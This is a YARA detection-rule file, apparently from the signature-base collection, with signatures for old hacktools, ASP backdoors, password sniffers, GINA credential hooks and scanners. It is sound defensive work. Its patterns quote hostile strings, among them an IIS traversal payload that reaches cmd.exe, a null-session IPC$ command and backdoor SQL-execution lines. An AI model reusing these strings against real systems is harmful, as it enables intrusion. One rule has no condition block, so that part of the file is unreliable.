		logic_hash = "e9c1d7cabe7236e059f4bfec917ca00c47a3db955746ebfcda0f5e733de359c7"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Sig_238_Runasex
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5fe349db-c0fc-5a49-97ee-3142f4e0e4c1"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2418-L2436"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
		logic_hash = "dac03251539028da02c9f26f20ca751ee577c125fb4f287c61ac2ea6afb1bb28"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
		$s8 = "cmd.bat" fullword ascii
		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
		$s11 = "%s Execute Succussifully." fullword ascii
		$s12 = "winsta0" fullword ascii
		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Sig_238_Nbtdump
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fe490f72-a07d-57c2-b9bb-d791fab10ec6"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2438-L2457"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
		logic_hash = "fd17851820b5036b4cc1ebb6f927bb62c898027a17b5376e9420cbfa6a166ef2"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "Cerberus NBTDUMP" fullword ascii
		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
		$s19 = "%s's password is %s</H3>" fullword wide
		$s20 = "%s's password is blank</H3>" fullword wide

	condition:
		5 of them
}

rule SIGNATURE_BASE_Sig_238_Glass2K
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7a2ad37a-6b55-5710-b07d-7c289cdbb04e"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2459-L2476"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
		logic_hash = "d9b6b904028d67804d095f85caea5796f528f866191d3b4250055a75511f2090"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
		$s4 = "Glass2k.exe" fullword wide
		$s7 = "NeoLite Executable File Compressor" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Splitjoin_V1_3_3_Rar_Folder_3
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4ffd7501-339c-52b7-8661-2c3ca57dfa1f"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2478-L2493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "21409117b536664a913dcd159d6f4d8758f43435"
		logic_hash = "79eb49413cd6919e4b91e916d2612e007fd2c4da7244d9e1e3dd04d46c461d8c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "ie686@sohu.com" fullword ascii
		$s3 = "splitjoin.exe" fullword ascii
		$s7 = "SplitJoin" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspbackdoor_EDIT
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
		author = "Florian Roth (Nextron Systems)"
		id = "cdcec370-97af-51c0-b81a-35a788f16ef4"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2495-L2514"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
		logic_hash = "0f97c831eb9f257a2a6c9a677dde2ce17d529584fb7085bc94edd83d886e469f"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
		$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
		$s3 = "response.write \"<a href='index.asp'>" fullword ascii
		$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
		$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
		$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii

rule SIGNATURE_BASE_Aspbackdoor_Entice
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file entice.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "68c61920-9c3c-5bfe-976c-346b258bb406"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2516-L2533"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
		logic_hash = "c11313351565d26d9b16a2d5c3c4589676593fe633c441a1c1a33b3c134a2d56"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Fpipe2_0
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e104cf6-69d2-590e-8999-4f0d448719f2"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2535-L2553"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "891609db7a6787575641154e7aab7757e74d837b"
		logic_hash = "b28566315ddda7765dfee722f5ad02c1206c6916363d86407fdc61b53148f511"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = " -s    - outbound connection source port number" fullword ascii
		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s4 = "http://www.foundstone.com" fullword ascii
		$s19 = "FPipe" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Instgina
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "ccbda689-e61a-501d-a8ed-62e3c1c20289"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2555-L2570"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
		logic_hash = "a55a13ced122b9901f0505d585e7a7c984d4231b3507282c1b15ff400ce51265"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "To Open Registry" fullword ascii
		$s4 = "I love Candy very much!!" ascii
		$s5 = "GinaDLL" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Arttray_Zip_Folder_Arttray
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "d29909a4-8663-54c7-8f0e-68b15def869f"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2572-L2588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
		logic_hash = "225be71bfd047331399162941edf06c72d2fd1afa04c78cbc51099665f50883b"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "http://www.brigsoft.com" fullword wide
		$s2 = "ArtTrayHookDll.dll" fullword ascii
		$s3 = "ArtTray Version 1.0 " fullword wide
		$s16 = "TRM_HOOKCALLBACK" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Findoor
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "61215a76-8c29-505d-bfef-a5f13fec476c"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2590-L2607"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
		logic_hash = "223f324ab6b61775d500dc248b9db8363ce915ec279a893a6f0ec92b273a27c0"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
		$s8 = "PASS hacker@hacker.com" fullword ascii
		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
		$s11 = "http://isno.yeah.net" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Aspbackdoor_Ipclear
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
		author = "Florian Roth (Nextron Systems)"
		id = "71ebecea-721f-5c5d-9997-6a57f070d91c"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2609-L2626"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
		logic_hash = "49fbe844a99aa8cae25db90e1d8cdeee13c81293bba7b3201afc4748cb0a6a7c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
		$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
		$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
		$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
		$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Wineggdropshellfinal_Zip_Folder_Injectt
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "16f04551-050f-5a07-a35b-a3a7dbba6803"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2628-L2645"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
		logic_hash = "01840f4df12fbf6f5f27a3050c841002678605cd373e9ea9b182b2026caa29f9"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "2TInject.Dll" fullword ascii
		$s2 = "Windows Services" fullword ascii
		$s3 = "Findrst6" fullword ascii
		$s4 = "Press Any Key To Continue......" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Gina_Zip_Folder_Gina
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "7ebc7218-9c7b-5595-ae7b-f316fc99d1f6"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2647-L2667"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
		logic_hash = "1344634346f9e7e3ef96c901705ac7bd4aa9a70cfbebf71c8222544e84ca9f98"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "NEWGINA.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "WlxActivateUserShell" fullword ascii
		$s6 = "WlxWkstaLockedSAS" fullword ascii
		$s13 = "WlxIsLockOk" fullword ascii
		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s16 = "WlxShutdown" fullword ascii
		$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Superscan3_0
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "d22aa3ae-4c62-5007-896d-7c473f0421a6"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2669-L2690"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
		logic_hash = "448d3af61062c53c5b148e58697537bd98316e6c6d4d9ed9e0ff36cbd5a0b4f5"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\scanner.ini" ascii
		$s1 = "\\scanner.exe" ascii
		$s2 = "\\scanner.lst" ascii
		$s4 = "\\hensss.lst" ascii
		$s5 = "STUB32.EXE" fullword wide
		$s6 = "STUB.EXE" fullword wide
		$s8 = "\\ws2check.exe" ascii
		$s9 = "\\trojans.lst" ascii
		$s10 = "1996 InstallShield Software Corporation" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Xsniff
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1e61a732-8691-5f84-beb0-c9f7e6d46538"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2692-L2713"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
		logic_hash = "90c08db197a00885ffc62967bd814479a438f500316cf65e81fcec617517dd9c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s3 = "%s - simple sniffer for win2000" fullword ascii
		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s7 = "http://www.xfocus.org" fullword ascii
		$s9 = "  -pass        : Filter username/password" fullword ascii
		$s18 = "  -udp         : Output udp packets" fullword ascii
		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s20 = "  -tcp         : Output tcp packets" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Sig_238_Fscan
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7af4d38a-bc88-57ba-b602-4e01d3d95015"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2715-L2736"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
		logic_hash = "0af558345e8c85021fd4f8d399dacb3b6e8d9c692060c31a36e943fc48bfabff"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
		$s13 = "http://www.foundstone.com" fullword ascii
		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
		$s18 = "Bind port number out of range. Using system default." fullword ascii
		$s19 = "fscan.exe" fullword wide

	condition:
		4 of them
}

rule SIGNATURE_BASE__Iissample_Nesscan_Twwwscan
{
	meta:
		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "a710ca8e-54dc-5a98-b173-c87b22af745f"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2738-L2764"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6088dd060507f4efa2f4c1770dc746100966e8a7475859918488d7be6c96bc31"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"

	strings:
		$s0 = "Connecting HTTP Port - Result: " fullword
		$s1 = "No space for command line argument vector" fullword
		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
		$s5 = "No space for copy of command line" fullword
		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
		$s8 = "scanf : floating point formats not linked" fullword
		$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
		$s13 = "!\"what?\"" fullword
		$s14 = "%s Port %d Closed" fullword
		$s16 = "printf : floating point formats not linked" fullword
		$s17 = "xxtype.cpp" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__Fshttp_Fspop_Fssniffer
{
	meta:
		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5ca543af-2589-52b0-83f9-ad25ba76b633"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2766-L2792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "50c91f1036ae467de51227b6782978c33607f94724d2e1b0af7c958028a84b48"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"

	strings:
		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
		$s1 = "-ERR Get SMS Users ID Failed" fullword
		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
		$s3 = "-ERR Post SMS Failed" fullword
		$s4 = "Current.hlt" fullword
		$s6 = "Histroy.hlt" fullword
		$s7 = "-ERR Send SMS Failed" fullword
		$s12 = "-ERR Change Password <New Password>" fullword
		$s17 = "+OK Send SMS Succussifully" fullword
		$s18 = "+OK Set New Password: [%s]" fullword
		$s19 = "CHANGE PASSWORD" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Ammyy_Admin_AA_V3
{
	meta:
		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bb140cb7-9f56-5acb-883e-080dfd3f60d5"
		date = "2014-12-22"
		modified = "2025-04-14"
		reference = "http://goo.gl/gkAg2E"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2794-L2818"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6ab1de9f3b58cdb2c03f2d72986772333f8b81c98e6cbfd941f20b2fed1c5ff2"
		score = 55
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"

	strings:
		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
		$x5 = "Please enter password for accessing remote computer" fullword ascii
		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii

	condition:
		2 of ( $x* ) or all of ( $s* )
}

rule SIGNATURE_BASE_Linuxhacktool_Eyes_Scanssh
{
	meta:
		description = "Linux hack tools - file scanssh"
		author = "Florian Roth (Nextron Systems)"
		id = "9546d0d8-42af-5b4c-ac93-195d14bfbb5b"
		date = "2015-01-19"
		modified = "2025-04-14"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2822-L2847"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
		logic_hash = "cb20c28f1767ce23f60c377943d8a129fa069b1a1407bbaf43370f0ff79ade30"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Connection closed by remote host" fullword ascii
		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
		$s5 = "Server closed connection" fullword ascii
		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
		$s9 = "Remote host closed connection" fullword ascii
		$s10 = "%s: line %d: bad command `%s'" fullword ascii
		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Linuxhacktool_Eyes_Pscan2
{
	meta:
		description = "Linux hack tools - file pscan2"
		author = "Florian Roth (Nextron Systems)"
		id = "02d96766-6696-5410-ad48-bd8cb642ac51"
		date = "2015-01-19"
		modified = "2025-04-14"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L2849-L2867"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
		logic_hash = "3686ccbd53a6dcedf9b10d131a1fc76b51b265328ad10f63671b64d4bf57a0b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
		$s8 = "Invalid IP." fullword ascii
		$s9 = "# scanning: " fullword ascii
		$s10 = "Unable to allocate socket." fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Linuxhacktool_Eyes_A
{
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth (Nextron Systems)"
		id = "2b4f52d4-b438-5040-89c5-aab1df15200e"
		date = "2015-01-19"
